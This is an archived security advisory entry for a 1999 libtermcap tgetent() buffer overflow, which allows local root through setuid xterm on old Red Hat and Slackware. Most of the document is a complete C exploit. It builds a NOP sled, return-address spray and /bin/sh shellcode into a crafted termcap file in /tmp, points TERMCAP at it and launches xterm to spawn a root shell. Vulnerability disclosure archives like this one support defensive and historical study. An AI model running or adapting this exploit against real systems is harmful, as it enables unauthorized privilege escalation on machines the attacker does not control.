source: http://www.securityfocus.com/bid/588/info

A buffer overflow existed in libtermcap's tgetent() function, which could cause the user to execute arbitrary code if they were able to supply their own termcap file. Versions of libtermcap 2.0.8 and earliear are vulnerable.

Under Red Hat Linux 5.2 and 4.2, this could lead to local users gaining root privileges, as xterm (as well as other possibly setuid programs) are linked against libtermcap. Under Red Hat Linux 6.0, xterm is not setuid root.

Debian and Caldera OpenLinux use the ncurses library instead of termcap and thus are not vulnerable.

/*
   ****************************************************
   ***          libtermcap xterm exploit            ***
   ***                by m0f0 1999                  ***
   ***                                              ***
   ***          it works for xterm/nxterm           ***
   ***          Tested Slackware 3.5, 3.6           ***
   ****************************************************
*/

#include <stdio.h>
#define BUF_SIZE 5000
#define POS_RET  2000
#define POS_SEP  3000
#define RETADDR  0xbfffefef
#define EGG      "/tmp/egg_termcap"

// shellcode
char shellcode[] = // 48 caracteres
    "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
    "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
    "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
    "\xff\xff/bin/sh";

void main (int argc, char *argv[]) {
  int i;
  FILE *f;
  char buf[BUF_SIZE];
  long retaddr, offset;
	
  printf ("\n");
  printf ("****************************************** \n");
  printf ("* libtermcap xterm exploit, by m0f0 1999 * \n");
  printf ("****************************************** \n\n");
  printf ("Use : %s [offset] \n", argv[0]);

  offset = 0;
  if (argc>1) {
    offset = atol (argv[1]);
  }

  retaddr = RETADDR + offset;
  printf ("Return Address = 0x%x \n",retaddr);
	

  // Fill buffer with NOP's
  memset (buf, 0x90, BUF_SIZE);
  buf[BUF_SIZE]=0;
	
  // Set termcap file header and sep
  memcpy (buf, "xterm|", 6);
  memcpy (buf+POS_SEP,":\\",2);

  // Return Address
  for (i=POS_RET; i<=POS_SEP-10; i+=4) {
    *(long*)(buf+i) = (long) retaddr;
  }

  // Copy shellCode
  for (i=0; i<strlen(shellcode); i++) {
    buf[i+2000] = shellcode[i];
  }

  // Write EGG_TERMCAP
  f = fopen (EGG,"w");
  fprintf (f,"%s",buf);
  fclose (f);
	
  // Export TERMCAP
  setenv ("TERMCAP", EGG, 1);

  // Run program
  execl ("/usr/X11R6/bin/xterm","xterm",NULL);

}


